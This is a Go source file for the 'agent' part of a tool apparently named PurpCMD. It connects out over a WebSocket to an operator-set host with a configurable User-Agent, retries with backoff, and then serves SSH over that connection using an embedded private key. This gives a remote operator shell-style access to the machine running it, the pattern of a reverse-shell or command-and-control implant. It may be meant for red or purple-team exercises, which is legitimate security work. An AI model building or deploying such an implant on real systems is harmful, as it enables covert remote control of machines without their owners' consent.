// https://groups.google.com/g/gorilla-web/c/VjXmApL1qA8

package agent

import (
	"embed"
	"flag"
	"io/ioutil"
	"log"
	"net/http"
	"purpcmd/utils"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

func CallWSServer(args []string, key embed.FS) {

	flags := flag.NewFlagSet("client", flag.ContinueOnError)

	var remoteAdd = flags.String("a","0.0.0.0:8080","Set remote host")
	var uri = flags.String("uri","/","Set URI")
	var ua = flags.String("ua","Mozilla PurpCMD","Set User-Agent")
	var pk = flags.String("p","","Public key")

	//var uri = flags.String("uri","/","URI")
	
	flags.Usage = utils.Usage
	flags.Parse(args)


	var t time.Duration = 1
	var c int = 0
	for {
		err := wsclient(*ua, *uri, *remoteAdd, key, *pk)
		if err != nil {
			log.Printf("Try %d sleep for %d", c, t)
			time.Sleep(t * time.Millisecond)
			if t >= 32768 {
				continue
			} else {
				t *= 2 
			}
		} else {
			break
		}
		if c == 25 {
			break
		}
		c++
	}
}

func wsclient(ua,uri, remoteAdd string, key embed.FS, pubKey string) error {
	log.Printf("Connecting to ws://%s%s", remoteAdd, uri)

	head := http.Header {
		"User-Agent": {ua},
	}
	
	wclient, _, err := websocket.DefaultDialer.Dial("ws://"+remoteAdd+uri, head)
	if err != nil {
		return err
	}
	defer wclient.Close()

	// create new connect file
	// "New" from adapter to use websock as net.Conn
	webSockConn := utils.New(wclient)
	defer webSockConn.Close()

	s := Session{
		AuthKeys: make(map[string]bool),
	}

	var PubKeyBytes []byte
	if pubKey == "" {
		PubKeyBytes, _ = key.ReadFile("utils/key/id_ecdsa.pub")
	} else {
		PubKeyBytes, err = ioutil.ReadFile(pubKey)
		utils.Err(err)
		log.Println("Using public key from", pubKey)
	}
	s.PubKey, _, _, _, err = ssh.ParseAuthorizedKey(PubKeyBytes)
	utils.Err(err)

	// Keep the fingerprint for authentication
	s.AuthKeys[FingerprintKey(s.PubKey)] = true

	config := &ssh.ServerConfig{
		PublicKeyCallback: s.pubCallBack, // Challenge with pubkey
	}

	privKey, _ := key.ReadFile("utils/key/id_ecdsa")
	pkey, err := ssh.ParsePrivateKey(privKey)
	utils.Err(err)
	config.AddHostKey(pkey)

	conn, chans, reqs, err := ssh.NewServerConn(webSockConn, config)
	utils.Err(err)
	go ssh.DiscardRequests(reqs)
	s.HandServerConn(conn.Permissions.Extensions["x"], chans)
	return nil
}
